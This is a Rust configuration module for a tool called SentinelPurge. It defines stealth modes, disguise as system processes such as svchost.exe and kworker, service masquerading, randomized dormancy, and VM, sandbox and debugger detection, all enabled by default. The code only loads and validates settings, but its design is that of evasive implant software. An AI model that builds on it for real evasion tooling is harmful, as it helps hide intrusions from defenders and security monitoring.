//! Configuration management for SentinelPurge
//!
//! Provides secure configuration handling with support for both file-based
//! and environment-based configuration options.

use crate::error::{Result, SentinelError};
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::time::Duration;

/// Main configuration structure for SentinelPurge
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SentinelConfig {
    /// Logging level (trace, debug, info, warn, error)
    pub log_level: String,
    /// Stealth operation configuration
    pub stealth: StealthConfig,
    /// Process identity configuration
    pub identity: IdentityConfig,
    /// Sleep and dormancy configuration
    pub sleep: SleepConfig,
    /// Evasion techniques configuration
    pub evasion: EvasionConfig,
}

/// Stealth operation configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StealthConfig {
    /// Enable stealth mode
    pub enabled: bool,
    /// Stealth operation mode
    pub mode: StealthMode,
    /// Maximum resource usage percentages
    pub max_cpu_usage: f32,
    pub max_memory_mb: u64,
    /// Communication encryption settings
    pub encryption_enabled: bool,
}

/// Stealth operation modes
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StealthMode {
    /// Minimal system footprint
    Silent,
    /// Extended dormancy with periodic wake cycles
    Hibernation,
    /// Disguise as legitimate system processes
    Mimicry,
    /// Advanced evasion of security monitoring
    Ghost,
    /// Dynamic behavior modification
    Adaptive,
}

/// Process identity configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IdentityConfig {
    /// Enable process disguise
    pub disguise_enabled: bool,
    /// List of legitimate process names to mimic
    pub mimic_processes: Vec<String>,
    /// Enable dynamic renaming
    pub dynamic_renaming: bool,
    /// Service masquerading settings
    pub service_masquerading: bool,
}

/// Sleep and dormancy configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SleepConfig {
    /// Enable sleep mode
    pub enabled: bool,
    /// Minimum sleep duration in seconds
    pub min_sleep_secs: u64,
    /// Maximum sleep duration in seconds
    pub max_sleep_secs: u64,
    /// Activity-based awakening triggers
    pub activity_triggers: Vec<String>,
    /// Randomize sleep cycles
    pub randomize_cycles: bool,
}

/// Evasion techniques configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvasionConfig {
    /// Enable VM detection
    pub vm_detection: bool,
    /// Enable sandbox detection
    pub sandbox_detection: bool,
    /// Enable debugger detection
    pub debugger_detection: bool,
    /// Enable memory protection
    pub memory_protection: bool,
    /// Enable API hooking detection
    pub api_hook_detection: bool,
}

impl Default for SentinelConfig {
    fn default() -> Self {
        Self {
            log_level: "info".to_string(),
            stealth: StealthConfig::default(),
            identity: IdentityConfig::default(),
            sleep: SleepConfig::default(),
            evasion: EvasionConfig::default(),
        }
    }
}

impl Default for StealthConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            mode: StealthMode::Silent,
            max_cpu_usage: 1.0, // 1% CPU max
            max_memory_mb: 10,   // 10MB max
            encryption_enabled: true,
        }
    }
}

impl Default for IdentityConfig {
    fn default() -> Self {
        Self {
            disguise_enabled: true,
            mimic_processes: vec![
                "svchost.exe".to_string(),
                "explorer.exe".to_string(),
                "systemd".to_string(),
                "kworker".to_string(),
            ],
            dynamic_renaming: true,
            service_masquerading: true,
        }
    }
}

impl Default for SleepConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            min_sleep_secs: 300,    // 5 minutes
            max_sleep_secs: 3600,   // 1 hour
            activity_triggers: vec![
                "system_idle".to_string(),
                "user_activity".to_string(),
                "network_activity".to_string(),
            ],
            randomize_cycles: true,
        }
    }
}

impl Default for EvasionConfig {
    fn default() -> Self {
        Self {
            vm_detection: true,
            sandbox_detection: true,
            debugger_detection: true,
            memory_protection: true,
            api_hook_detection: true,
        }
    }
}

impl SentinelConfig {
    /// Load configuration from a file
    pub fn from_file<P: AsRef<Path>>(path: P) -> Result<Self> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| SentinelError::config(format!("Failed to read config file: {}", e)))?;
        
        let config: Self = serde_json::from_str(&content)
            .map_err(|e| SentinelError::config(format!("Failed to parse config: {}", e)))?;
        
        config.validate()?;
        Ok(config)
    }

    /// Save configuration to a file
    pub fn to_file<P: AsRef<Path>>(&self, path: P) -> Result<()> {
        let content = serde_json::to_string_pretty(self)
            .map_err(|e| SentinelError::config(format!("Failed to serialize config: {}", e)))?;
        
        std::fs::write(path, content)
            .map_err(|e| SentinelError::config(format!("Failed to write config file: {}", e)))?;
        
        Ok(())
    }

    /// Load configuration from environment variables
    pub fn from_env() -> Result<Self> {
        let mut config = Self::default();
        
        if let Ok(level) = std::env::var("SENTINEL_LOG_LEVEL") {
            config.log_level = level;
        }
        
        if let Ok(enabled) = std::env::var("SENTINEL_STEALTH_ENABLED") {
            config.stealth.enabled = enabled.parse()
                .map_err(|_| SentinelError::config("Invalid SENTINEL_STEALTH_ENABLED value"))?;
        }
        
        config.validate()?;
        Ok(config)
    }

    /// Validate configuration settings
    pub fn validate(&self) -> Result<()> {
        // Validate log level
        if !["trace", "debug", "info", "warn", "error"].contains(&self.log_level.as_str()) {
            return Err(SentinelError::config("Invalid log level"));
        }

        // Validate resource limits
        if self.stealth.max_cpu_usage < 0.0 || self.stealth.max_cpu_usage > 100.0 {
            return Err(SentinelError::config("CPU usage must be between 0 and 100"));
        }

        if self.stealth.max_memory_mb == 0 {
            return Err(SentinelError::config("Memory limit must be greater than 0"));
        }

        // Validate sleep configuration
        if self.sleep.min_sleep_secs > self.sleep.max_sleep_secs {
            return Err(SentinelError::config("Min sleep duration cannot exceed max sleep duration"));
        }

        Ok(())
    }

    /// Get sleep duration range
    pub fn sleep_duration_range(&self) -> (Duration, Duration) {
        (
            Duration::from_secs(self.sleep.min_sleep_secs),
            Duration::from_secs(self.sleep.max_sleep_secs),
        )
    }
}